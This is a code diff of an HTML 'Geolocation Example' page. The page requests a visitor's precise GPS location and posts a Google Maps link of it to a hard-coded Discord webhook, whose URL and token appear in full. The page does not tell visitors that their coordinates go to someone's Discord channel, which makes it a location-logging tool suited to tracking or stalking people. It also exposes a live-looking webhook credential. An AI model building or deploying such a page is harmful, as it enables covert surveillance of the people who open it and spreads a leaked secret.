@@ -21,11 +21,25 @@
             font-size: 16px;
             color: #555;
         }
+        #testLocation {
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        #testLocation:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
     </style>
 </head>
 <body>
     <h1>Geolocation Example</h1>
-    <p id="status">Trying to access your location...</p>
+    <p id="status">Click the button below to attempt to access your location.</p>
+    <button id="testLocation">Get Location</button>
     <p id="instructions">
         If you denied the request for location access, please enable it in your browser settings to send your location.
         <br><br>
@@ -33,10 +47,20 @@
     </p>
 
     <script>
+        document.getElementById('testLocation').addEventListener('click', function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendPosition, showError, {
+                    enableHighAccuracy: true
+                });
+            } else {
+                document.getElementById('status').textContent = "Geolocation is not supported by this browser.";
+            }
+        });
+
         function sendPosition(position) {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
-            const webhookUrl = "https://your-webhook-url.com";  // เปลี่ยนเป็น URL ของ Webhook ของคุณ
+            const webhookUrl = "https://discord.com/api/webhooks/1272943176063123621/6MwZvPOZPoKX_iupyJJ-E19Kb9gZVeYfUH0IeLL-PrYUNOeXlq4j1aJSLyKcce4kdT1C";
 
             const data = {
                 content: `Current location: https://www.google.com/maps?q=${latitude},${longitude}`
@@ -65,6 +89,7 @@
                 case error.PERMISSION_DENIED:
                     errorMessage = "User denied the request for Geolocation. Please enable location access in your browser settings.";
                     document.getElementById('instructions').style.display = 'block';
+                    document.getElementById('testLocation').disabled = true;
                     break;
                 case error.POSITION_UNAVAILABLE:
                     errorMessage = "Location information is unavailable.";
@@ -75,16 +100,6 @@
             }
             document.getElementById('status').textContent = errorMessage;
         }
-
-        window.onload = function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendPosition, showError, {
-                    enableHighAccuracy: true
-                });
-            } else {
-                document.getElementById('status').textContent = "Geolocation is not supported by this browser.";
-            }
-        };
     </script>
 </body>
 </html>
